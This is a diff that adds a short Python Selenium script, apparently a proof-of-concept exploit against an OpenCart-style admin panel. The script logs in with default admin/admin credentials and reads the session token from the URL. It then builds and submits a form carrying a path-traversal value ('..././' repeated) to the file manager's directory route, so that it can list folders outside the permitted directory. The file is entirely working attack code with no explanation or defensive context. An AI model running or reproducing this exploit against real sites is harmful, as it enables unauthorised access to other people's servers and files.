@@ -1,0 +1,32 @@
+# coding=utf-8
+from selenium import webdriver
+
+profile = webdriver.FirefoxProfile()
+profile.accept_untrusted_certs = True
+driver = webdriver.Firefox(firefox_profile=profile)
+driver.maximize_window()
+
+driver.get('https://app8.com/upload/admin/')
+elem = driver.find_element_by_name("username")
+elem.send_keys('admin')
+elem = driver.find_element_by_name("password")
+elem.send_keys('admin')
+button = driver.find_element_by_class_name('button')
+button.click()
+currenturl = driver.current_url
+token = currenturl[-32:]
+newurl = 'https://app8.com/upload/admin/index.php?route=common/filemanager/directory&token=' + token
+try:
+	temphtml = open('temp.html','a')
+	temphtml.write('<html><body>\n')
+	temphtml.write('<form action="'+newurl+'" method="post">\n')
+	temphtml.write('<input type="hidden" name="directory" value="..././..././..././..././..././..././..././">\n')
+	temphtml.write('<input type="submit" value="Test"></form>\n')
+	temphtml.write('</body></html>\n')
+	temphtml.close()
+	driver.get('file://temp.html')
+	button = driver.find_element_by_xpath('//input[@type="submit"]')
+	button.click()
+except:
+	exit()
+
